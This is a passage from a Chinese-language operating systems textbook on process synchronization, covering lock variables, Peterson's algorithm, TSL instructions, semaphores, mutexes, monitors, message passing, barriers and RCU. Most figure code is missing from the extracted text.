所以结论是：屏蔽中断对于操作系统本 身而言是一项很有用的技术，但对于用户进程则不是一种合适的通用互斥机制。
2.锁变量
作为第二种尝试，可以寻找一种软件解决方案。
设想有一个共享(锁)变量，其初始值为0。
当一 个进程想进入其临界区时，它首先测试这把锁。
如果该锁的值为0,则该进程将其设置为1并进入临界区。
若这把锁的值已经为1,则该进程将等待直到其值变为0。
于是，0就表示临界区内没有进程，1表示已经 有某个进程进入临界区。
但是，这种想法也包含了与假脱机目录一样的疏漏。
假设一个进程读出锁变量的值并发现它为0, 而恰好在它将其值设置为1之前，另一个进程被调度运行，将该锁变量设置为1。
当第一个进程再次运行 时，它同样也将该锁设置为1,则此时同时有两个进程进入临界区中。
可能读者会想，先读出锁变量，紧接着在改变其值之前再检查一遍它的值，这样便可以解决问题。
但这实际上无济于事，如果第二个进程恰好在第一个进程完成第二次检查之后修改了锁变量的值，则同 样还会发生竞争条件。
3.严格轮换法
第三种互斥的方法如图2-23所示。
几乎与本书中所有其他程序一样，这里的程序段用C语言编写。
之所以选择C语言是由于实际的操作系统普遍用C语言编写(或偶尔用C++), 而基本上不用像Java 、 Modula3 或Pascal 这样的语言。
对于编写操作系统而言，C 语言是强大、有效、可预知和有特性的语言。
而对于Java, 它就不是可预知的，因为它在关键时刻会用完存储器，而在不合适的时候会调用垃圾收集 程序回收内存。
在C语言中，这种情形就不可能发生，因为C语言中不需要进行空间回收。
有关C 、C++ 、 Java和其他四种语言的定量比较可参阅 (Prechelt,2000)。
在图2-23中，整型变量turn, 初始值为0,用于记录轮到哪个进程进入临界区，并检查或更新共享内 存。
开始时，进程0检查turn, 发现其值为0,于是进入临界区。
进程1也发现其值为0,所以在一个等待 循环中不停地测试turn, 看其值何时变为1。
连续测试一个变量直到某个值出现为止，称为忙等待 (busy waiting) 。
由于这种方式浪费CPU时间，所以通常应该避免。
只有在有理由认为等待时间是非常短的情 形下，才使用忙等待。
用于忙等待的锁，称为自旋锁 (spin lock)。
while(TRUE){
while (turn !
=0);
critical_region();
turn=1;
noncritical_region(); }
a)
while(TRUE){
while (turn !
=1); /*循环*/
critical_region();
turn=0;
noncritical_region();
b)
图2-23 临界区问题的一种解法(在两种情况下请注意分号终止了while语句):a) 进程0;b) 进程1
进程0离开临界区时，它将turn 的值设置为1,以便允许进程1进入其临界区。
假设进程1很快便离开 了临界区，则此时两个进程都处于临界区之外，turn 的值又被设置为0。
现在进程0很快就执行完其整个 循环，它退出临界区，并将turn 的值设置为1。
此时，turn 的值为1,两个进程都在其临界区外执行。
突然，进程0结束了非临界区的操作并且返回到循环的开始。
但是，这时它不能进入临界区，因为 turn的当前值为1,而此时进程1还在忙于非临界区的操作，进程0只有继续while 循环，直到进程1把turn 的值改为0。
这说明，在一个进程比另一个慢了很多的情况下，轮流进入临界区并不是一个好办法。
这种情况违反了前面叙述的条件3:进程0被一个临界区之外的进程阻塞。
再回到前面假脱机目录的 问题，如果现在将临界区与读写假脱机目录相联系，则进程0有可能因为进程1在做其他事情而被禁止打 印另一个文件。
实际上，该方案要求两个进程严格地轮流进入它们的临界区，如假脱机文件等。
任何一个进程都不 可能在一轮中打印两个文件。
尽管该算法的确避免了所有的竞争条件，但由于它违反了条件3,所以不 能作为一个很好的备选方案。
4.Peterson解法
荷兰数学家T.Dekker 通过将锁变量与警告变量的思想相结合，最早提出了一个不需要严格轮换的软 件互斥算法。
关于Dekker 的算法，请参阅 (Dijkstra,1965)。
1981年，G.L.Peterson 发现了一种简单得多的互斥算法，这使得Dekker 的方法不再有任何新意。
Peterson的算法如图2-24所示。
该算法由两个用ANSI C编写的过程组成。
ANSI C要求为所定义和使用的 所有函数提供函数原型。
不过，为了节省篇幅，这里和后续的例子中我们都不会给出函数原型。
图2-24 完成互斥的Peterson 解法
在使用共享变量(即进入其临界区)之前，各个进程使用其进程号0或1作为参数来调用enter_ region。
该调用在需要时将使进程等待，直到能安全地进入临界区。
在完成对共享变量的操作之后，进 程将调用leave_region, 表示操作已完成，若其他的进程希望进入临界区，则现在就可以进入。
现在来看看这个方案是如何工作的。
一开始，没有任何进程处于临界区中，现在进程0调用enter_ region 。
它通过设置其数组元素和将turn 置为0来标识它希望进入临界区。
由于进程1并不想进入临界区， 所以enter_region 很快便返回。
如果进程1现在调用enter_region, 进程1将在此处挂起直到interested[0] 变 成FALSE, 该事件只有在进程0调用leave_region 退出临界区时才会发生。
现在考虑两个进程几乎同时调用enter_region 的情况。
它们都将自己的进程号存入turn, 但 只 有 后 被 保存进去的进程号才有效，前一个因被重写而丢失。
假设进程1是后存入的，则turn 为1。
当两个进程都 运行到while 语句时，进程0将循环0次并进入临界区，而进程1则将不停地循环且不能进入临界区，直到 进程0退出临界区为止。
5.TSL 指令
现在来看需要硬件支持的一种方案。
某些计算机中，特别是那些设计为多处理器的计算机，都有下 面一条指令：
TSL RX,LOCK
着重说明一下，锁住存储总线不同于屏蔽中断。
屏蔽中断，然后在读内存字之后跟着写操作并不能 阻止总线上的第二个处理器在读操作和写操作之间访问该内存字。
事实上，在处理器1上屏蔽中断对处 理器2根本没有任何影响。
让处理器2远离内存直到处理器1完成的唯一方法就是锁住总线，这需要一个 特殊的硬件设施(基本上，一根总线就可以确保总线由锁住它的处理器使用，而其他的处理器不能用)。
为了使用TSL 指令，要使用一个共享变量lock 来协调对共享内存的访问。
当lock 为0时，任何进程 都可以使用TSL 指令将其设置为1,并读写共享内存。
当操作结束时，进程用一条普通的move 指令将 lock的值重新设置为0。
图2-25 用TSL指令进入和离开临界区
现在有一种很明确的解法了。
进程在进入临界区之前先调用enter_region, 这将导致忙等待，直到 锁空闲为止，随后它获得该锁并返回。
在进程从临界区返回时它调用leave_region, 这将把lock 设置为0。
与基于临界区问题的所有解法一样，进程必须在正确的时间调用enter_region 和 leave_region, 解法才能 奏效。
如果一个进程有欺诈行为，则互斥将会失败。
换言之，只有进程合作，临界区才能工作。
一个可替代TSL 的指令是XCHG, 它原子性地交换了两个位置的内容，例如， 一个寄存器与一个存 储器字。
代码如图2-26所示，而且就像可以看到的那样，它本质上与TSL的解决办法一样。
所有的Intel x86 CPU在低层同步中使用XCHG 指令。
图2-26 用XCHG指令进入和离开临界区
2.3.4 睡眠与唤醒
Peterson解法和TSL 或XCHG 解法都是正确的，但它们都有忙等待的缺点。
这些解法在本质上是这样的：
当一个进程想进入临界区时，先检查是否允许进入，若不允许，则该进程将原地等待，直到允许为止。
这种方法不仅浪费了CPU时间，而且还可能引起预想不到的结果。
考虑一台计算机有两个进程，H 优先级较高，L 优先级较低。
调度规则规定，只要H处于就绪态它就可以运行。
在某一时刻，L 处于临界 区中，此时H变到就绪态，准备运行(例如， 一条I/O操作结束)。
现在H开始忙等待，但由于当H就绪时 L不会被调度，也就无法离开临界区，所以H将永远忙等待下去。
这种情况有时被称作优先级反转问题 (priority inversion problem)。
现在来考察几条进程间通信原语，它们在无法进入临界区时将阻塞，而不是忙等待。
最简单的是 sleep 和wakeup 。
sleep 是一个将引起调用进程阻塞的系统调用，即被挂起，直到另外一个进程将其唤 醒 。
wakeup 调用有一个参数，即要被唤醒的进程。
另一种方法是让sleep 和wakeup 各有一个参数，即 有一个用于匹配sleep 和wakeup 的内存地址。
生产者一消费者问题
作为使用这些原语的一个例子，我们考虑生产者一消费者 (producer-consumer) 问题，也称作有界 缓冲区 (bounded-buffer) 问题。
两个进程共享一个公共的固定大小的缓冲区。
其中一个是生产者，将 信息放入缓冲区；另一个是消费者，从缓冲区中取出信息。
(也可以把这个问题一般化为m个生产者和n 个消费者问题，但是这里只讨论一个生产者和一个消费者的情况，这样可以简化解决方案。
)
问题在于当缓冲区已满，而此时生产者还想向其中放入一个新的数据项的情况。
其解决办法是让生 产者睡眠，待消费者从缓冲区中取出一个或多个数据项时再唤醒它。
同样地，当消费者试图从缓冲区中 取数据而发现缓冲区为空时，消费者就睡眠，直到生产者向其中放入一些数据时再将其唤醒。
这个方法听起来很简单，但它包含与前边假脱机目录问题一样的竞争条件。
为了跟踪缓冲区中的数 据项数，需要一个变量count。
如果缓冲区最多存放N个数据项，则生产者代码将首先检查count 是否达到 N, 若是，则生产者睡眠；否则生产者向缓冲区中放入一个数据项并增量count 的值。
消费者的代码与此类似：首先测试count是否为0,若是，则睡眠；否则从中取走一个数据项并递减count 的值。
每个进程同时也检测另一个进程是否应被唤醒，若是则唤醒之。
生产者和消费者的代码如图2-27所示。
图2-27 含有严重竞争条件的生产者-消费者问题
为了在C语言中表示sleep 和wakeup 这样的系统调用，我们将以库函数调用的形式来表示。
尽管它 们不是标准C库的一部分，但在实际上任何系统中都具有这些库函数。
未列出的过程insert_item 和 remove_item 用来记录将数据项放入缓冲区和从缓冲区取出数据等事项。
但是，消费者此时在逻辑上并未睡眠，所以wakeup 信号丢失。
当消费者下次运行时，它将测试先 前读到的count 值，发现它为0,于是睡眠。
生产者迟早会填满整个缓冲区，然后睡眠。
这样一来，两个 进程都将永远睡眠下去。
2.3.5 信号量
信号量是E.W.Dijkstra 在1965年提出的一种方法，它使用一个整型变量来累计唤醒次数，供以后使 用。
在他的建议中引入了一个新的变量类型，称作信号量 (semaphore) 。
一个信号量的取值可以为0 (表示没有保存下来的唤醒操作)或者为正值(表示有一个或多个唤醒操作)。
up操作对信号量的值增1。
如果一个或多个进程在该信号量上睡眠，无法完成一个先前的down 操作， 则由系统选择其中的一个(如随机挑选)并允许该进程完成它的down 操作。
于是，对一个有进程在其 上睡眠的信号量执行一次up 操作之后，该信号量的值仍旧是0,但在其上睡眠的进程却少了一个。
信号 量的值增1和唤醒一个进程同样也是不可分割的。
不会有某个进程因执行up 而阻塞，正如在前面的模型 中不会有进程因执行wakeup 而阻塞一样。
用信号量解决生产者一消费者问题
用信号量解决丢失的wakeup问题，如图2-28所示。
为确保信号量能正确工作，最重要的是要采用一 种不可分割的方式来实现它。
通常是将up 和down 作为系统调用实现，而且操作系统只需在执行以下操 作时暂时屏蔽全部中断：测试信号量、更新信号量以及在需要时使某个进程睡眠。
由于这些动作只需要 几条指令，所以屏蔽中断不会带来什么副作用。
如果使用多个CPU, 则每个信号量应由一个锁变量进行 保护。
通过TSL 或XCHG 指令来确保同一时刻只有一个CPU在对信号量进行操作。
读者必须搞清楚，使用TSL 或XCHG指令来防止几个CPU同时访问一个信号量，这与生产者或消费 者使用忙等待来等待对方腾出或填充缓冲区是完全不同的。
信号量操作仅需几个毫秒，而生产者或消费 者则可能需要任意长的时间。
该解决方案使用了三个信号量：一个称为full, 用来记录充满的缓冲槽数目； 一个称为empty, 记录 空的缓冲槽数目； 一个称为mutex, 用来确保生产者和消费者不会同时访问缓冲区。
full的初值为0,
empty的初值为缓冲区中槽的数目，mutex 初值为1。
供两个或多个进程使用的信号量，其初值为1,保证 同时只有一个进程可以进入临界区，称作二元信号量(binary semaphore)。
如果每个进程在进入临界区 前都执行一个down 操作，并在刚刚退出时执行一个up操作，就能够实现互斥。
在有了进程间通信原语之后，我们观察一下图2-5中的中断顺序。
在使用信号量的系统中，隐藏中断的 最自然的方法是为每一个I/O设备设置一个信号量，其初值为0。
在启动一个I/O设备之后，管理进程就立即对 相关联的信号量执行一个down 操作，于是进程立即被阻塞。
当中断到来时，中断处理程序随后对相关信号 量执行一个up操作，从而将相关的进程设置为就绪状态。
在该模型中，图2-5中的第5步包括在设备的信号量 上执行up操作，这样在第6步中，调度程序将能执行设备管理程序。
当然，如果这时有几个进程就绪，则调 度程序下次可以选择一个更为重要的进程来运行。
本章的后续内容中，我们将看到调度算法是如何进行的。
图2-28的例子实际上是通过两种不同的方式来使用信号量的，两者之间的区别是很重要的。
信号量 mutex 用于互斥，它用于保证任一时刻只有一个进程读写缓冲区和相关的变量。
互斥是避免混乱所必需 的操作。
在下一节中，我们将讨论互斥量及其实现方法。
图2-28 使用信号量的生产者一消费者问题
信号量的另一种用途是用于实现同步(synchronization) 。
信号量full和empty用来保证某种事件的顺 序发生或不发生。
在本例中，它们保证当缓冲区满的时候生产者停止运行，以及当缓冲区空的时候消费 者停止运行。
这种用法与互斥是不同的。
2.3.6 互斥量
如果不需要信号量的计数能力，有时可以使用信号量的一个简化版本，称为互斥量 (mutex) 。
互 斥 量仅仅适用于管理共享资源或一小段代码。
由于互斥量在实现时既容易又有效，这使得互斥量在实现用 户空间线程包时非常有用。
由于互斥量非常简单，所以如果有可用的TSL 或XCHG 指令，就可以很容易地在用户空间中实现它 们。
用于用户级线程包的mutex_lock 和mutex_unlock 代码如图2-29所示。
XCHG 解法本质上是相同的。
图2-29 mutex_lock 和mutex_unlock 的实现
mutex_lock 的代码与图2-25中enter_region 的代码很相似，但有一个关键的区别。
当enter_region 进 入临界区失败时，它始终重复测试锁(忙等待)。
实际上，由于时钟超时的作用，会调度其他进程运行。
这样迟早拥有锁的进程会进入运行并释放锁。
在(用户)线程中，情形有所不同，因为没有时钟停止运行时间过长的线程。
结果是通过忙等待的 方式来试图获得锁的线程将永远循环下去，决不会得到锁，因为这个运行的线程不会让其他线程运行从 而释放锁。
以上就是enter_region 和mutex_lock 的差别所在。
在后者取锁失败时，它调用thread_yield 将CPU 放 弃给另一个线程。
这样，就没有忙等待。
在该线程下次运行时，它再一次对锁进行测试。
由 于thread_yield 只是在用户空间中对线程调度程序的一个调用，所以它的运行非常快捷。
这样， mutex_lock 和mutex_unlock 都不需要任何内核调用。
通过使用这些过程，用户线程完全可以实现在用户 空间中的同步，这些过程仅仅需要少量的指令。
上面所叙述的互斥量系统是一套调用框架。
对于软件来说，总是需要更多的特性，而同步原语也不 例外。
例如，有时线程包提供一个调用mutex_trylock, 这个调用或者获得锁或者返回失败码，但并不阻 塞线程。
这就给了调用线程一个灵活性，用以决定下一步做什么,是使用替代办法还只是等待下去。
到目前为止，我们掩盖了一个问题，不过现在还是有必要把这个问题提出来。
在用户级线程包中， 多个线程访问同一个互斥量是没有问题的，因为所有的线程都在一个公共地址空间中操作。
但是，对于 大多数早期解决方案，诸如Peterson 算法和信号量等，都有一个未说明的前提，即这些多个进程至少应 该访问一些共享内存，也许仅仅是一个字。
如果进程有不连续的地址空间，如我们始终提到的，那么在 Peterson算法、信号量或公共缓冲区中，它们如何共享turn变量呢?
有两种方案。
第一种，有些共享数据结构，如信号量，可以存放在内核中，并且只能通过系统调用 来访问。
这种处理方式化解了上述问题。
第二种，多数现代操作系统(包括UNIX 和Windows) 提供 一 种方法，让进程与其他进程共享其部分地址空间。
在这种方法中，缓冲区和其他数据结构可以共享。
在 最坏的情形下，如果没有可共享的途径，则可以使用共享文件。
如果两个或多个进程共享其全部或大部分地址空间，进程和线程之间的差别就变得模糊起来，但无论 怎样，两者的差别还是有的。
共享一个公共地址空间的两个进程仍旧有各自的打开文件、定时器以及其他 一些单个进程的特性，而在单个进程中的线程，则共享进程全部的特性。
另外，共享一个公共地址空间的 多个进程决不会拥有用户级线程的效率，这一点是不容置疑的，这是因为内核还同其管理密切相关。
1.快速用户区互斥量futex
2.pthread 中的互斥量
除互斥量之外，pthread 提供了另一种同步机制：条件变量。
互斥量在允许或阻塞对临界区的访问上 是很有用的，条件变量则允许线程由于一些未达到的条件而阻塞。
绝大部分情况下这两种方法是一起使 用的。
现在让我们进一步地研究线程、互斥量、条件变量之间的关联。
举一个简单的例子，再次考虑一下生产者-消费者问题：一个线程将产品放在一个缓冲区内，由另 一个线程将它们取出。
如果生产者发现缓冲区中没有空槽可以使用了，它不得不阻塞起来直到有一个空
图2-30 一些与互斥量相关的pthread调用
图2-31 一些与条件变量相关的pthread调用
槽可以使用。
生产者使用互斥量可以进行原子性检查，而不受其他线程干扰。
但是当发现缓冲区已经满 了以后，生产者需要一种方法来阻塞自己并在以后被唤醒。
这便是条件变量做的事了。
图2-31给出了与条件变量相关的最重要的pthread 调用。
就像你可能期待的那样，这里有专门的调用 用来创建和撤销条件变量。
它们可以有属性，并且有不同的调用来管理它们(图中没有给出)。
条件变 量上的主要操作是pthread_cond_wait 和pthread_cond_signal, 前者阻塞调用线程直到另一其他线程向它 发信号(使用后一个调用)。
当然，阻塞与等待的原因不是等待与发信号协议的一部分。
被阻塞的线程 经常是在等待发信号的线程去做某些工作、释放某些资源或是进行其他的一些活动。
只有完成后被阻塞 的线程才可以继续运行。
条件变量允许这种等待与阻塞原子性地进行。
当有多个线程被阻塞并等待同一 个信号时，可以使用pthread_cond_broadcast 调用。
条件变量与互斥量经常一起使用。
这种模式用于让一个线程锁住一个互斥量，然后当它不能获得它 期待的结果时等待一个条件变量。
最后另一个线程会向它发信号，使它可以继续执行。
pthread_cond_wait 原子性地调用并解锁它持有的互斥量。
由于这个原因，互斥量是参数之一。
值得指出的是，条件变量(不像信号量)不会存在内存中。
如果将一个信号量传递给一个没有线程 在等待的条件变量，那么这个信号就会丢失。
程序员必须小心使用避免丢失信号。
作为如何使用一个互斥量与条件变量的例子，图2-32展示了一个非常简单只有一个缓冲区的生产
图2-32 利用线程解决生产者-消费者问题
者一消费者问题。
当生产者填满缓冲区时，它在生产下一个数据项之前必须等待，直到消费者清空了它。
类似地，当消费者移走一个数据项时，它必须等待，直到生产者生产了另外一个数据项。
尽管很简单， 这个例子却说明了基本的机制。
使一个线程睡眠的语句应该总是要检查这个条件，以保证线程在继续执 行前满足条件，因为线程可能已经因为一个UNIX 信号或其他原因而被唤醒。
2.3.7 管程
有了信号量和互斥量之后，进程间通信看来就很容易了，实际是这样的吗?
答案是否定的。
请仔细 考察图2-28中向缓冲区放入数据项以及从中删除数据项之前的down 操作。
假设将生产者代码中的两个 down 操作交换一下次序，将使得mutex 的值在empty 之前而不是在其之后被减1。
如果缓冲区完全满了， 生产者将阻塞，mutex 值为0。
这样一来，当消费者下次试图访问缓冲区时，它将对mutex 执行一个down 操作，由于mutex 值为0,则消费者也将阻塞。
两个进程都将永远地阻塞下去，无法再进行有效的工作， 这种不幸的状况称作死锁 (dead lock)。
我们将在第6章中详细讨论死锁问题。
指出这个问题是为了说明使用信号量时要非常小心。
一处很小的错误将导致很大的麻烦。
这就像用 汇编语言编程一样，甚至更糟，因为这里出现的错误都是竞争条件、死锁以及其他一些不可预测和不可
为了更易于编写正确的程序，Brinch Hansen(1973) 和Hoare(1974) 提出了一种高级同步原语，称为管程 (monitor) 。
在下面的介绍中会发现，他们两人提出的方 案略有不同。
一个管程是一个由过程、变量及数据结构 等组成的一个集合，它们组成一个特殊的模块或软件包。
进程可在任何需要的时候调用管程中的过程，但它们不 能在管程之外声明的过程中直接访问管程内的数据结 构。
图2-33展示了用一种抽象的、类Pascal语言描述的管 程。
这里不能使用C语言，因为管程是语言概念而C语言 并不支持它。
管程有一个很重要的特性，即任一时刻管程中只能
有一个活跃进程，这一特性使管程能有效地完成互斥。
管程是编程语言的组成部分，编译器知道它们的 特殊性，因此可以采用与其他过程调用不同的方法来处理对管程的调用。
典型的处理方法是，当一个进 程调用管程过程时，该过程中的前几条指令将检查在管程中是否有其他的活跃进程。
如果有，调用进程 将被挂起，直到另一个进程离开管程将其唤醒。
如果没有活跃进程在使用管程，则该调用进程可以进入。
进入管程时的互斥由编译器负责，但通常的做法是用一个互斥量或二元信号量。
因为是由编译器而 非程序员来安排互斥，所以出错的可能性要小得多。
在任一时刻，写管程的人无须关心编译器是如何实现 互斥的。
他只需知道将所有的临界区转换成管程过程即可，决不会有两个进程同时执行临界区中的代码。
尽管管程提供了一种实现互斥的简便途径，但这还不够，还需要一种办法使得进程在无法继续运行 时被阻塞。
在生产者一消费者问题中，很容易将针对缓冲区满和缓冲区空的测试放到管程过程中，但是 生产者在发现缓冲区满的时候如何阻塞呢?
解决的方法是引入条件变量 (condition variables) 以及相关的两个操作：wait 和signal 。
当一个管 程过程发现它无法继续运行时(例如，生产者发现缓冲区满),它会在某个条件变量上(如full) 执 行 wait操作。
该操作导致调用进程自身阻塞，并且还将另一个以前等在管程之外的进程调入管程。
在前面 介绍pthread 时我们已经看到条件变量及其操作了。
另一个进程，比如消费者，可以唤醒正在睡眠的伙伴进程，这可以通过对其伙伴正在等待的一个条 件变量执行signal 完成。
为了避免管程中同时有两个活跃进程，我们需要一条规则来通知在signal 之后 该怎么办。
Hoare 建议让新唤醒的进程运行，而挂起另一个进程。
Brinch Hansen则建议执行signal 的 进 程必须立即退出管程，即signal 语句只可能作为一个管程过程的最后一条语句。
这里将采纳Brinch Hansen 的建议，因为它在概念上更简单，并且更容易实现。
如果在一个条件变量上有若干进程正在等 待，则在对该条件变量执行signal 操作后，系统调度程序只能在其中选择一个使其恢复运行。
顺便提一下，还有一个Hoare和Brinch Hansen都没有提及的第三种方法，该方法让发信号者继续运
行，并且只有在发信号者退出管程之后，才允许等待的 进程开始运行。
条件变量不是计数器，条件变量也不能像信号量那样 积累信号以便以后使用。
所以，如果向一个条件变量发送 信号，但是在该条件变量上并没有等待进程，则该信号会 永远丢失。
换句话说，wait 操作必须在signal 之前。
这条 规则使得实现简单了许多。
实际上这不是一个问题，因为 在需要时，用变量很容易跟踪每个进程的状态。
一个原本 要执行signal的进程，只要检查这些变量便可以知道该操 作是否有必要。
在图2-34中给出了用类Pascal 语言，通过管程实现的 生产者-消费者问题的解法框架。
使用类Pascal语言的优点 在于清晰、简单，并且严格符合Hoare/Brinch Hansen模型。
读者可能会觉得wait 和signal 操作看起来像前面提到 的sleep 和wakeup, 而且已经看到后者存在严重的竞争 条件。
是的，它们确实很像，但是有个很关键的区别： sleep 和wakeup 之所以失败是因为当一个进程想睡眠时 另一个进程试图去唤醒它。
使用管程则不会发生这种情 况。
对管程过程的自动互斥保证了这一点：如果管程过 程中的生产者发现缓冲区满，它将能够完成wait 操作而不 用担心调度程序可能会在wait 完成之前切换到消费者。
甚 至，在wait 执行完成而且把生产者标志为不可运行之前， 根本不会允许消费者进入管程。
使用Java 管程解决生产者一消费者问题的解法如图
图2-34 用管程实现的生产者-消费者问题 的解法框架。
一次只能有一个管程 过程活跃。
其中的缓冲区有N个槽
2-35所示。
该解法中有4个类。
外部类 (outer class)ProducerConsumer 创建并启动两个线程，p 和c。
第 二个类和第三个类producer和consumer分别包含生产者和消费者的代码。
最后，类our_monitor是管程， 它有两个同步线程，用于在共享缓冲区中插入和取出数据项。
与前面的例子不同，我们在这里给出了 insert和remove 的全部代码。
在前面所有的例子中，生产者和消费者线程在功能上与它们的等同部分是相同的。
生产者有一个无 限循环，该无限循环产生数据并将数据放入公共缓冲区中；消费者也有一个等价的无限循环，该无限循 环从公共缓冲区取出数据并完成一些有趣的工作。
该程序中比较有意思的部分是类our_monitor,它包含缓冲区、管理变量以及两个同步方法。
当生 产者在insert 内活动时，它确信消费者不能在remove 中活动，从而保证更新变量和缓冲区的安全，且不 用担心竞争条件。
变量count 记录在缓冲区中数据项的数量。
它的取值可以取从0到N-1 之间任何值。
变 量lo是缓冲区槽的序号，指出将要取出的下一个数据项。
类似地，hi 是缓冲区中下一个将要放入的数据 项序号。
允许lo=hi, 其含义是在缓冲区中有0个或N个数据项。
count 的值说明了究竟是哪一种情形。
Java 中的同步方法与其他经典管程有本质差别：Java 没有内嵌的条件变量。
反之，Java 提供了两个
过程wait 和notify, 分 别 与sleep 和wakeup 等价，不过，当它们在同步方法中使用时，它们不受竞争条 件约束。
理论上，方法wait 可以被中断，它本身就是与中断有关的代码。
Java 需要显式表示异常处理。
在本文的要求中，只要认为go_to_sleep 就是去睡眠即可。
图2-35 用Java 语言实现的生产者-消费者问题的解法
通过临界区互斥的自动化，管程比信号量更容易保证并行编程的正确性。
但管程也有缺点。
我们之 所以使用类Pascal和Java, 而不像在本书中其他例子那样使用C语言，并不是没有原因的。
正如前面提到
过的，管程是一个编程语言概念，编译器必须要识别管程并用某种方式对其互斥做出安排。
C 、Pascal 以及多数其他语言都没有管程，所以指望这些编译器遵守互斥规则是不合理的。
实际中，如何能让编译 器知道哪些过程属于管程，哪些不属于管程呢?
与管程和信号量有关的另一个问题是，这些机制都是设计用来解决访问公共内存的一个或多个CPU 上的互斥问题的。
通过将信号量放在共享内存中并用TSL 或XCHG指令来保护它们，可以避免竞争。
如 果一个分布式系统具有多个CPU, 并且每个CPU拥有自己的私有内存，它们通过一个局域网相连，那么 这些原语将失效。
这里的结论是：信号量太低级了，而管程在少数几种编程语言之外又无法使用，并且， 这些原语均未提供机器间的信息交换方法。
所以还需要其他的方法。
2.3.8 消息传递
send(destination,&message); 和
receive(source,&message);
前一个调用向一个给定的目标发送一条消息，后一个调用从一个给定的源(或者是任意源，如果接收者 不介意的话)接收一条消息。
如果没有消息可用，则接收者可能被阻塞，直到一条消息到达，或者，带 着一个错误码立即返回。
1.消息传递系统的设计要点
消息传递系统面临着许多信号量和管程所未涉及的问题和设计难点，特别是位于网络中不同机器上 的通信进程的情况。
例如，消息有可能被网络丢失。
为了防止消息丢失，发送方和接收方可以达成如下 一致：一旦接收到信息，接收方马上回送一条特殊的确认 (acknowledgement) 消息。
如果发送方在一 段时间间隔内未收到确认，则重发消息。
现在考虑消息本身被正确接收，而返回给发送者的确认信息丢失的情况。
发送者将重发信息，这样 接收者将接收到两次相同的消息。
对于接收者来说，如何区分新的消息和一条重发的老消息是非常重要 的。
通常采用在每条原始消息中嵌入一个连续的序号来解决此问题。
如果接收者收到一条消息，它具有 与前面某一条消息一样的序号，就知道这条消息是重复的，可以忽略。
不可靠消息传递中的成功通信问 题是计算机网络的主要研究内容。
更多的信息可以参考相关文献Tanenbaum(1996) 和Wetherall(2010)。
对于发送者和接收者在同一台机器上的情况，也存在若干设计问题。
其中一个设计问题就是性能问 题。
将消息从一个进程复制到另一个进程通常比信号量操作和进入管程要慢。
2.用消息传递解决生产者一消费者问题
现在我们来考察如何用消息传递而不是共享内存来解决生产者一消费者问题。
在图2-36中给出了一 种解法。
假设所有的消息都有同样的大小，并且在尚未接收到发出的消息时，由操作系统自动进行缓冲。
在该解决方案中共使用N条消息，这就类似于一块共享内存缓冲区中的N个槽。
消费者首先将N条空消息 发送给生产者。
当生产者向消费者传递一个数据项时，它取走一条空消息并送回一条填充了内容的消息。
通过这种方式，系统中总的消息数保持不变，所以消息都可以存放在事先确定数量的内存中。
如果生产者的速度比消费者快，则所有的消息最终都将被填满，等待消费者，生产者将被阻塞，等
待返回一条空消息。
如果消费者速度快，则情况正好相反：所有的消息均为空，等待生产者来填充它们， 消费者被阻塞，以等待一条填充过的消息。
消息传递方式可以有许多变体，下面首先介绍如何对消息进行编址。
一种方法是为每个进程分配一
个唯一的地址，让消息按进程的地址编址。
另一种方法是引入一种新的数据结构，称作信箱 (mailbox)。
信箱是一个用来对一定数量的消息进行缓冲的地方，信箱中消息数量的设置方法也有多种，典型的方法 是在信箱创建时确定消息的数量。
当使用信箱时，在send 和receive 调用中的地址参数就是信箱的地址， 而不是进程的地址。
当一个进程试图向一个满的信箱发消息时，它将被挂起，直到信箱内有消息被取走， 从而为新消息腾出空间。
对于生产者一消费者问题，生产者和消费者均应创建足够容纳N条消息的信箱。
生产者向消费者信 箱发送包含实际数据的消息，消费者则向生产者信箱发送空的消息。
当使用信箱时，缓冲机制的作用是 很清楚的：目标信箱容纳那些已被发送但尚未被目标进程接收的消息。
图2-36 用N条消息实现的生产者-消费者问题
使用信箱的另一种极端方法是彻底取消缓冲。
采用这种方法时，如果send 在receive 之前执行，则 发送进程被阻塞，直到receive 发生。
在执行receive 时，消息可以直接从发送者复制到接收者，不用任 何中间缓冲。
类似地，如果先执行receive, 则接收者会被阻塞，直到send 发生。
这种方案常被称为会 合 (rendezvous) 。
与带有缓冲的消息方案相比，该方案实现起来更容易一些，但却降低了灵活性，因为 发送者和接收者一定要以步步紧接的方式运行。
通常在并行程序设计系统中使用消息传递。
例如， 一个著名的消息传递系统是消息传递接口 (Message-Passing Interface,MPI),它广泛应用在科学计算中。
有关该系统的更多信息，可参考Gropp 等人(1994)和Snir 等人(1996)的文献。
2.3.9 屏 障
最后一个同步机制是准备用于进程组而不是用于双进程的生产者一消费者类情形的。
在有些应用中 划分了若干阶段，并且规定，除非所有的进程都就绪准备着手下一个阶段，否则任何进程都不能进入下
一个阶段。
可以通过在每个阶段的结尾安置屏障 (barrier) 来实现这种行为。
当一个进程到达屏障时，它 就被屏障阻拦，直到所有进程都到达该屏障为止。
屏障可用于一组进程同步，屏障的操作如图2-37所示。
在图2-37a中可以看到有四个进程接近屏障，这意味着它们正在运算，但是还没有到达每个阶段的 结尾。
过了一会儿，第一个进程完成了所有需要在第一阶段进行的计算。
它接着执行barrier 原语，这通 常是调用一个库过程。
于是该进程被挂起。
一会儿，第二个和第三个进程也完成了第一阶段的计算，也 接着执行barrier 原语。
这种情形如图2-37b所示。
结果，当最后一个进程C到达屏障时，所有的进程就一 起被释放，如图2-37c所示。
作为一个需要屏障的例子，考虑在物理或工程中的一个典型弛豫问题。
这是一个带有初值的矩阵。
这些值可能代表一块金属板上各个点的温度值。
基本想法可以是准备计算如下的问题：要花费多长时间， 在一个角上的火焰才能传播到整个板上。
时间一 → a)
时间
b)
时间
c)
图2-37 屏障的使用：a) 进程接近屏障；b) 除了一个之外所有的进程都被屏障阻塞；c) 当最后一个进程 到达屏障时，所有的进程一起通过
2.3.10 避免锁：读一复制一更新
最快的锁是根本没有锁。
问题在于在没有锁的情况下，我们是否允许对共享数据结构的并发读写进 行访问。
在通常情况下，答案显然是否定的。
假设进程A正在对一个数字数组进行排序，而进程B正在 计算其均值。
因为A在数组中将数值前后来回移动，所以B可能多次遇到某些数值，而某些数值则根本 没有遇到过。
得到的结果可能是任意值，而它几乎肯定是错的。
读-复制一更新 (Read-Copy-Update,RCU), 将更新过程中的移除和再分配过程分离开来。
当然，还有一个问题。
只要还不能确定没有对B和D更多的读操作，我们就不能真正释放它们。
但是应 该等待多久呢?
一分钟?
或者十分钟?
我们不得不等到最后一个读操作读完这些节点。
